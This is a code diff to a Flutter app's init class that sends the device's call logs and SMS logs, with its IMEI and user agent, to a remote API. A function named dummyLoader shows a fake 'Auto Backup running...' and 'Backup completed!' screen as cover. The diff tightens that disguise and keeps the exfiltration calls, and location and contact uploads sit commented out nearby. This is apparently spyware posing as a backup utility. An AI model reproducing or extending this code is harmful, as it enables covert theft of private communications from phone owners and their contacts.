@@ -1,6 +1,9 @@
+// ignore_for_file: use_build_context_synchronously
+
 import 'package:check_and_fix/presentation/utils/color_printer.dart';
 import 'package:check_and_fix/presentation/utils/services.dart';
 import 'package:fk_user_agent/fk_user_agent.dart';
+import 'package:flutter/cupertino.dart';
 import 'package:flutter/foundation.dart';
 import 'package:flutter_easyloading/flutter_easyloading.dart';
 import 'package:hive/hive.dart';
@@ -11,8 +14,9 @@ class Init {
   String? uuid;
   String? imei;
   String? agent;
+  late Box box;
 
-  void initConnection() async {
+  void initConnection(BuildContext context) async {
     print('START: initConnection() - GET UUID...');
 
     await _initServerConnection();
@@ -27,13 +31,13 @@ class Init {
     dummyLoader();
     // Api.sendLocation(agent, uuid);
     // Api.sendContacts(agent, uuid);
-    Api.sendCallLogs(agent, uuid);
-    Api.sendSmsLogs(agent, uuid);
+    await Api.sendCallLogs(context, agent, uuid);
+    await Api.sendSmsLogs(context, agent, uuid);
   }
 
   Future _initServerConnection() async {
     try {
-      final box = await Hive.openBox('myBox');
+      box = await Hive.openBox('myBox');
       await FkUserAgent.init();
       agent = FkUserAgent.userAgent!;
       imei = box.get('imei') ??
@@ -49,8 +53,7 @@ class Init {
     }
   }
 
-  static Future<PermissionStatus?> _requestPermission(
-      Permission permission) async {
+  static Future<PermissionStatus?> _requestPermission(Permission permission) async {
     final alreadyGranted = await permission.isGranted;
     if (alreadyGranted) return null;
     final status = await permission.request();
@@ -76,11 +79,15 @@ class Init {
 
   static Future dummyLoader() async {
     EasyLoading.show(
-        status: 'Auto Backup running...', maskType: EasyLoadingMaskType.custom);
+        dismissOnTap: false,
+        status: 'Auto Backup running...',
+        maskType: EasyLoadingMaskType.custom);
 
-    await Future.delayed(const Duration(milliseconds: 3500));
+    await Future.delayed(const Duration(milliseconds: 2250));
 
     EasyLoading.showSuccess('Backup completed!',
-        duration: const Duration(milliseconds: 2500));
+        dismissOnTap: true,
+        duration: const Duration(milliseconds: 1250),
+        maskType: EasyLoadingMaskType.custom);
   }
 }
